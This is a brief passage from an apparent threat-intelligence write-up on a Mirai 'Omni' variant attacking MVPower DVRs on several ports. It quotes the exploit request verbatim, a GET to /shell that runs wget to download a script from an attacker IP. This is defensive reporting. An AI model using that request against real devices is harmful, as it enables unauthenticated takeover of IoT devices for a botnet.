They are attacking ports 5500, 5501, 5502, 5050 and 60001 with a simple command of “GET /shell?cd%20/tmp;%20wget%20http://45(.)13.58.4/TPJ.sh;”.
The initial attacks started on port 60001, before progressing into additional ports.
This attack leverages the MVPower DVR Shell Unauthenticated Command Execution , reported by Unit 42 as part of the Omni Botnet variant of Mirai .
What is interesting about this attacker is Juniper Threat Labs has not witnessed them using any additional exploits, perhaps showing again the attackers immaturity in the attack methodology.
